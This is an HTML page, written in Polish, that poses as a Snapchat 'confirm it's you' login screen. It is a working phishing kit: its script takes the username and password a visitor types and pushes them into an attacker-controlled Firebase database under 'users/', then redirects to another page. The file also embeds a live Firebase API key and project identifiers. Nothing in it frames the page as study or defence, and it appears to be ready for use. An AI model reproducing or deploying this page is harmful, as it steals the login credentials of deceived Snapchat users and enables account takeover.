<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #FFFC00; /* Żółty kolor Snapchata */
        }
        .container {
            text-align: center;
            background-color: white;
            padding: 20px;
            border-radius: 20px;
            box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.2);
            width: 90%;
            max-width: 400px;
            box-sizing: border-box;
        }
        .logo {
            width: 60px;
            margin-bottom: 20px;
        }
        .confirmation-text {
            font-size: 22px;
            color: #333;
            margin-bottom: 20px;
            font-weight: bold;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            margin-top: 20px;
            background-color: #000;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #333;
        }

        @media screen and (max-width: 600px) {
            .container {
                width: 100%;
                padding: 15px;
                border-radius: 15px;
            }
            .logo {
                width: 50px;
            }
            .confirmation-text {
                font-size: 20px;
                margin-bottom: 15px;
            }
            input[type="text"], input[type="password"] {
                padding: 10px;
                margin: 8px 0;
            }
            button {
                padding: 10px;
                font-size: 15px;
            }
        }
    </style>
</head>
<body>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/512px-Snapchat_logo.svg.png" alt="Snapchat Logo" class="logo">
    <div class="confirmation-text">Potwierdź, że to Ty</div>
    <input type="text" id="username" placeholder="Nazwa użytkownika lub e-mail">
    <input type="password" id="password" placeholder="Hasło">
    <button onclick="saveInput()">Zaloguj się</button>
</div>

<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database.js"></script>

<script>
    // Konfiguracja Firebase
    const firebaseConfig = {

  apiKey: "AIzaSyDAfctq-ntcNQ_kW0LPLFo60Yj0aD1jwLM",

  authDomain: "xavimaciekprojekt.firebaseapp.com",

  projectId: "xavimaciekprojekt",

  storageBucket: "xavimaciekprojekt.appspot.com",

  messagingSenderId: "148796632074",

  appId: "1:148796632074:web:be8e1da415f1535d6943f3",

  measurementId: "G-K01549BGQ3"

};

    // Inicjalizacja Firebase
    const app = firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    function saveInput() {
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        // Zapis danych do bazy danych Firebase
        firebase.database().ref('users/').push({
            username: username,
            password: password
        });

        window.location.href = 'message.html';
    }
</script>

</body>
</html>
